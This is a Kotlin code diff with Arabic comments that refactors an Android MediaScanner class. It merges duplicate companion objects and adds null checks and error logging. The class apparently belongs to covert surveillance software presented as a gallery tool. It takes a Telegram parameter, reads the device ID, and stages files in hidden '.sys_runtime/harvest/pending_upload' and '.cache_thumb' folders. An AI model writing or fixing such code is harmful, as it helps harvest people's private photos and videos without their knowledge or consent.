@@ -38,10 +38,20 @@ class MediaScanner(
     telegram: Any? = null
 ) : GalleryBrowser(context, scanner, telegram) {
 
+    // ========== ✅ دمج companion object (مكرر) في كائن واحد ==========
     companion object {
         private const val TAG = "MediaScanner"
         private const val DATABASE_NAME = "media_categories.db"
         private const val DATABASE_VERSION = 1
+
+        @JvmStatic
+        fun create(
+            context: Context,
+            scanner: Any? = null,
+            telegram: Any? = null
+        ): MediaScanner {
+            return MediaScanner(context, scanner, telegram)
+        }
     }
 
     // ========== قاعدة البيانات الداخلية للتصنيفات ==========
@@ -52,18 +62,6 @@ class MediaScanner(
     // ========== ContentObserver لمراقبة MediaStore ==========
     private val mediaObserver = MediaStoreObserver(Handler(Looper.getMainLooper()))
     private var isObserving = false
-
-    // ========== دوال المصنع ==========
-    companion object Factory {
-        @JvmStatic
-        fun create(
-            context: Context,
-            scanner: Any? = null,
-            telegram: Any? = null
-        ): MediaScanner {
-            return MediaScanner(context, scanner, telegram)
-        }
-    }
 
     // ============================================================
     //  استرجاع قائمة الملفات حسب التصنيف (مع دعم الفيديو والتصنيفات)
@@ -94,7 +92,12 @@ class MediaScanner(
     // ============================================================
 
     private fun getPendingFiles(limit: Int): List<Map<String, Any>> {
-        val ctx = appContext ?: return emptyList()
+        val ctx = appContext
+        if (ctx == null) {
+            Log.e(TAG, "appContext is null in getPendingFiles")
+            return emptyList()
+        }
+
         val files = mutableListOf<Map<String, Any>>()
 
         val dirs = listOf(
@@ -201,7 +204,12 @@ class MediaScanner(
         projection: Array<String>,
         defaultType: String
     ): List<Map<String, Any>> {
-        val ctx = appContext ?: return emptyList()
+        val ctx = appContext
+        if (ctx == null) {
+            Log.e(TAG, "appContext is null in queryMediaStore")
+            return emptyList()
+        }
+
         val results = mutableListOf<Map<String, Any>>()
 
         try {
@@ -294,7 +302,8 @@ class MediaScanner(
 
             cursor?.use {
                 if (it.moveToFirst()) {
-                    val category = it.getString(0)
+                    // ✅ إصلاح Type mismatch: التحقق من null قبل إنشاء Pair
+                    val category = it.getString(0) ?: return null
                     val prob = it.getFloat(1)
                     return Pair(category, prob)
                 }
@@ -359,8 +368,13 @@ class MediaScanner(
      */
     private fun startObserving() {
         if (isObserving) return
+        val ctx = appContext
+        if (ctx == null) {
+            Log.e(TAG, "appContext is null in startObserving")
+            return
+        }
+
         try {
-            val ctx = appContext ?: return
             ctx.contentResolver.registerContentObserver(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 true,
@@ -383,8 +397,13 @@ class MediaScanner(
      */
     private fun stopObserving() {
         if (!isObserving) return
+        val ctx = appContext
+        if (ctx == null) {
+            Log.e(TAG, "appContext is null in stopObserving")
+            return
+        }
+
         try {
-            val ctx = appContext ?: return
             ctx.contentResolver.unregisterContentObserver(mediaObserver)
             isObserving = false
             Log.d(TAG, "🛑 MediaStore observer stopped")
@@ -416,7 +435,12 @@ class MediaScanner(
     // ============================================================
 
     override fun getDid(): String {
-        val ctx = appContext ?: return "Unknown"
+        val ctx = appContext
+        if (ctx == null) {
+            Log.e(TAG, "appContext is null in getDid")
+            return "Unknown"
+        }
+
         return try {
             android.provider.Settings.Secure.getString(
                 ctx.contentResolver,
@@ -429,7 +453,12 @@ class MediaScanner(
     }
 
     override fun getPendingCount(): Int {
-        val ctx = appContext ?: return 0
+        val ctx = appContext
+        if (ctx == null) {
+            Log.e(TAG, "appContext is null in getPendingCount")
+            return 0
+        }
+
         var count = 0
         val dirs = listOf(
             File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
@@ -447,7 +476,12 @@ class MediaScanner(
         if (hash.isBlank()) return false
         Log.d(TAG, "deleteFileByHash called with hash=$hash")
 
-        val ctx = appContext ?: return false
+        val ctx = appContext
+        if (ctx == null) {
+            Log.e(TAG, "appContext is null in deleteFileByHash")
+            return false
+        }
+
         val dirs = listOf(
             File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
             File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
